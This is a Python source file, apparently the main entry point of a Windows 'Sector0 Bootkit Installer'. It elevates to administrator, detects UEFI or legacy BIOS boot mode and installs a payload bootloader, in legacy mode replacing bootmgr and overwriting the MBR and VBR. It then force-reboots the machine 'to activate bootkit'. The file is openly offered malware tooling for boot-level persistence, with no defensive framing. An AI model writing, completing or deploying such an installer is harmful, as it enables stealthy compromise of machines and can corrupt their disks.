#!/usr/bin/env python3
"""
Sector0 Bootkit Installer
============================
Main entry point for bootkit installation.

Usage:
    python installer.py [options]
    
Options:
    --no-reboot     Don't reboot after installation
    --verbose       Enable verbose logging
    --uefi-only     Force UEFI mode
    --bios-only     Force Legacy BIOS mode
"""

import sys
import os
import argparse
import subprocess
import traceback

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from config import (
    BASE_DIR, LOG_FILE, PAYLOADS_DIR,
    UEFI, BIOS, INSTALLER,
    get_uefi_binary_path, get_bios_binary_path
)
from core import (
    log, init_logging, is_admin, request_admin, 
    is_windows, allocate_console
)
from core.disk import DiskManager
from core.legacy import LegacyBootInstaller
from core.uefi import UEFIBootInstaller


def parse_args():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description="Sector0 Bootkit Installer")
    parser.add_argument("--no-reboot", action="store_true", help="Don't reboot after installation")
    parser.add_argument("--verbose", action="store_true", default=True, help="Verbose output")
    parser.add_argument("--uefi-only", action="store_true", help="Force UEFI mode")
    parser.add_argument("--bios-only", action="store_true", help="Force Legacy BIOS mode")
    return parser.parse_args()


def main():
    """Main installer entry point."""
    args = parse_args()
    
    # Allocate console for frozen exe
    allocate_console()
    
    # Initialize logging
    init_logging(LOG_FILE, args.verbose)
    
    log("=" * 50, "INFO")
    log("Sector0 Bootkit Installer", "INFO")
    log("=" * 50, "INFO")
    
    # Check platform
    if not is_windows():
        log("This installer only runs on Windows", "ERROR")
        return 1
    
    # Request admin if needed
    if not is_admin():
        request_admin()
        return 0  # Will restart elevated
    
    log("Running with administrator privileges", "INFO")
    
    try:
        # Initialize disk manager
        disk = DiskManager()
        
        # Detect boot mode
        if args.uefi_only:
            boot_mode = "UEFI"
        elif args.bios_only:
            boot_mode = "BIOS"
        else:
            boot_mode = disk.detect_boot_mode()
        
        log(f"Boot mode: {boot_mode}", "INFO")
        
        # Run appropriate installer
        if boot_mode == "UEFI":
            binary_path = get_uefi_binary_path()
            
            if not os.path.exists(binary_path):
                log(f"UEFI binary not found: {binary_path}", "ERROR")
                log("Please place BOOTX64.efi in the payloads/ directory", "ERROR")
                return 1
            
            config = {
                "binary_path": binary_path,
                "binary": UEFI["binary"],
                "efi_path": UEFI["efi_path"],
                "boot_name": UEFI["boot_name"],
            }
            
            installer = UEFIBootInstaller(disk, config)
            success = installer.install()
            
        else:  # BIOS
            binary_path = get_bios_binary_path()
            
            if not os.path.exists(binary_path):
                log(f"BIOS binary not found: {binary_path}", "ERROR")
                log("Please place bootloader.bin in the payloads/ directory", "ERROR")
                return 1
            
            config = {
                "binary_path": binary_path,
                "dest_name": BIOS["dest_name"],
                "create_backup": INSTALLER["create_backup"],
                "replace_bootmgr": True,
                "write_vbr": True,
                "write_mbr": True,
            }
            
            installer = LegacyBootInstaller(disk, config)
            success = installer.install()
        
        if success:
            log("=" * 50, "INFO")
            log("INSTALLATION SUCCESSFUL", "INFO")
            log("=" * 50, "INFO")
            
            if INSTALLER["auto_reboot"] and not args.no_reboot:
                log(f"Rebooting in {INSTALLER['reboot_delay']} seconds...", "INFO")
                subprocess.run([
                    "shutdown", "/r", "/f", "/t", 
                    str(INSTALLER["reboot_delay"])
                ])
            else:
                log("Reboot manually to activate bootkit", "INFO")
            
            return 0
        else:
            log("Installation failed", "ERROR")
            return 1
            
    except Exception as e:
        log(f"Fatal error: {e}", "ERROR")
        log(traceback.format_exc(), "DEBUG")
        return 1


if __name__ == "__main__":
    sys.exit(main())
